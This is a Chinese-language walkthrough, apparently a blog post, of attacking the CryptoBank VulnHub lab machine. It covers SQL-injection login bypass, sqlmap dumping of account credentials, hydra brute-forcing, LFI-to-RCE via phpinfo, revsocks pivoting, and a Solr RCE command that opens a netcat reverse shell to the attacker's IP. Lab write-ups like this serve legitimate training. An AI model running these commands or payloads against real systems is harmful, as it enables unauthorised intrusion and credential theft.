
# CryptoBank靶机渗透测试


                                阅读量   
                                **351337**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                    



[![](./img/203923/t01e49ae4f715a728e3.png)](./img/203923/t01e49ae4f715a728e3.png)



## 靶机下载地址及配置

[cryptobank](https://download.vulnhub.com/cryptobank/CryptoBank.ova)靶机下载地址<br>
cryptobank靶机IP: 192.168.56.132(cryptobank.local)<br>
kali攻击机IP： 192.168.56.116



## 知识点及工具

nmap<br>
sqlmap<br>
dirb<br>
sql注入<br>
代理<br>
apache solr RCE



## 实战渗透

首先第一步对目标靶机IP进行网络端口服务扫描

`nmap -A -p- 192.168.56.132`

[![](./img/203923/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t013cfd77fe46c7a58c.png)<br>
扫描结果显示目标端口开放了22（ssh）,80（http）端口，访问80web服务<br>[http://192.168.56.132](http://192.168.56.132)<br>[![](./img/203923/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t015f80330a81566272.png)<br>
点击访问其他得链接发现解析不了需添加hosts，界面暂无发现好东西，对目录进行了扫描，可以看见有development(http登录),info.php(phpinfo信息)，trade(登录界面)<br>[![](./img/203923/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0138e947e59b937024.png)<br>
接下来就转向了trade登录界面，使用常见用户名admin,root,test尝试登录看看是否为弱口令,登录出错提示信息”Login Failed! Wrong username or password”<br>[![](./img/203923/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01e8071e0cdc3e9f0e.png)<br>
突然有想法尝试万能密码了 binggo 登录成功 ‘or’=’or’<br>[![](./img/203923/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t011ab7ca9146c36f93.png)<br>[![](./img/203923/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01f0511fafd8aaf84a.png)<br>
登录成功后我也没发现什么其他的，还是sql注入。用sqlmap跑一跑用户名跟密码吧，后面肯定是要用到账号的。<br>
先抓取登录的包

```
POST /trade/login_auth.php HTTP/1.1
Host: cryptobank.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://cryptobank.local/trade/index.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 33
Connection: close
Cookie: PHPSESSID=po43jcjcj6f8edvsp8qrjvltdj
Upgrade-Insecure-Requests: 1

user=admin&amp;pass=admin&amp;login=Login

```

接下来sqlmap直接开干

`sqlmap -u "http://cryptobank.local/trade/login_auth.php" --data="login=Login&amp;pass=admin&amp;user=admin" -p pass --random-agent --dbs`

[![](./img/203923/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t012925f2c5bc95d925.png)<br>
可以看到靶机存在5张表，数据库类型为mysql<br>
由于靶机标题为cryptobank所有要用到的表肯定也是cryptobank表，爆爆爆

`sqlmap -u "http://cryptobank.local/trade/login_auth.php" --data="login=Login&amp;pass=admin&amp;user=admin" -p pass --random-agent --dbms=mysql -D cryptobank --tables`

[![](./img/203923/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t015d2868a7740fb314.png)

此用户账号在acccounts里,列出列名

`sqlmap -u "http://cryptobank.local/trade/login_auth.php" --data="login=Login&amp;pass=admin&amp;user=admin" -p pass --random-agent --dbms=mysql -D cryptobank -T accounts --dump`

[![](./img/203923/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01270c62943202a7d5.png)<br>
得到了这么多账号密码，随便拿一个可以直接登录<br>
拿着这些密码，ssh爆破一番没有结果，接下来转向了develpoment目录<br>
访问登录提示需要开发人员登录，对这个develpoment目录用这些账号密码也尝试了一次，发现开发人员的账户不在这个里面，须再找<br>[![](./img/203923/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t011af2ac3fbc2776c5.png)

在首页看见了一个团队各员工的职位，看到了development人员<br>[![](./img/203923/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01f1556d2aae9c768e.png)<br>
点击邮件按钮，发现一个疑似用户名，猜测julius.b/juliusbook为用户名<br>[![](./img/203923/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01e2c3e03f3fcaeb3e.png)<br>
然后添加到用户字典中，再次进行爆破

`hydra -L bankuser.txt -P bankpassword.txt -f cryptobank.local http-get /develpoment`

[![](./img/203923/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01b1c964d195ab740b.png)<br>
账号密码登录之后就看到一句话only for develpoment,没其他的了吗，我还不信，好不容易找到账号密码登录<br>[![](./img/203923/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01f1fd8c80b12272f8.png)<br>
再次对目录扫描一遍，这个扫描需要登录之后有身份验证才能扫描出来，再次进行抓包拿到验证身份，使用dirbuster扫描，添加headers<br>[![](./img/203923/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0192b227cec3121298.png)<br>
扫描到了一个tools目录<br>[![](./img/203923/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t016592854a913c76b9.png)<br>
访问之后，有三个功能(代码执行，系统文件，文件上传)<br>[![](./img/203923/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t015b2e89298db27657.png)<br>
第一个看见文件上传了 心理有点小激动，点击打开了，我直接上传php，发现被防火墙拦截了，只能上传png文件，尝试绕过了一些方法，但是没有绕过去，TCL<br>[![](./img/203923/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0106a4d821f8c6b7a9.png)<br>
命令执行那个有个登录，就没搞了，点开系统文件的，发现地址栏有file=谁谁谁，想到LFI本地文件包含<br>[http://cryptobank.local/development/tools/FileInclusion/pages/fetchmeafile.php?file=file.txt](http://cryptobank.local/development/tools/FileInclusion/pages/fetchmeafile.php?file=file.txt)<br>[![](./img/203923/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01e2d4a95c24f369e5.png)<br>
/etc/password,/etc/hosts等都被墙了，但是他能读到具体的某些文件/vr/www/cryptobank/info.php<br>[![](./img/203923/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01c7ae6dfc9b7cd115.png)<br>
管他墙不墙的了，正好这个phpinfo可以想起LFI-phpinfo利用，[https://dl.packetstormsecurity.net/papers/general/LFI_With_PHPInfo_Assitance.pdf](https://dl.packetstormsecurity.net/papers/general/LFI_With_PHPInfo_Assitance.pdf)

[github搜索找到了一个RCE](https://github.com/M4LV0/LFI-phpinfo-RCE/blob/master/exploit.py)<br>
修改一下配置参数,这里记得加上身份认证，我当时没加弄得我作死了很久

```
$ip = '192.168.56.116';
REQ1="""POST /info.php?a="""+padding+""" HTTP/1.1r
LFIREQ="""GET /development/tools/FileInclusion/pages/fetchmeafile.php?file=%s HTTP/1.1r
添加 Authorization: Basic anVsaXVzLmI6d0pXbTRDZ1YyNg==
```

[![](./img/203923/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t017d8a79ce86a94418.png)<br>
然后直接利用，可以看到成功反弹shell<br>[![](./img/203923/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t011622984ce5e70db4.png)<br>
读取cryptobank用户下的flag.txt<br>[![](./img/203923/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0125ba0c64891a2210.png)<br>
接下来就是提权为某用户身份了，上传一个LinEnum.sh脚本让他自己跑一下，在开放端口处发现一个地址开放了一个8983的端口，猜测应该是solr<br>[![](./img/203923/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0164f83f5f6c839032.png)<br>
因为不是本地的，看着像是docker的，所以现在给代理出来，这里代理我用了这个[revsocks](https://github.com/kost/revsocks/releases)工具,可以根据自己系统下载对应版本<br>
在kali开启监听

`./revsocks_linux_amd64 -listen :8088 -socks 0.0.0.0:1080 -pass cryptobank`

[![](./img/203923/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t019bc9eeaa56670a51.png)<br>
在靶机执行

`./revsocks_linux_amd64 -connect 192.168.56.116:8088 -pass cryptobank`

[![](./img/203923/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01a05dd47244486986.png)

代理已经开启，接下来就要在浏览器或者proxychain设置一下才能用哦<br>
火狐浏览器代理配置<br>[![](./img/203923/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t016cc3d44df7034f96.png)<br>
proxychain配置<br>[![](./img/203923/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t018bd372f36195fb17.png)<br>
浏览器访问地址，没想到还真是solr [http://172.17.0.1:8983/](http://172.17.0.1:8983/)<br>[![](./img/203923/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0160af48249de0da63.png)<br>
二话没说，去年有个[模板远程代码执行](https://www.exploit-db.com/exploits/47572)，听说win的有个0day哟，嘿嘿

`proxychains python solr_rce.py 172.17.0.1 8983 "nc -e /bin/bash 192.168.56.116 1234"`

[![](./img/203923/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01e83e55d2e3c4da59.png)<br>
已成功利用，输入id查看身份，可sudo哟，还真的免密登录。<br>[![](./img/203923/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01fef7d46503c681ce.png)<br>
最后靶机就完成了，哦耶
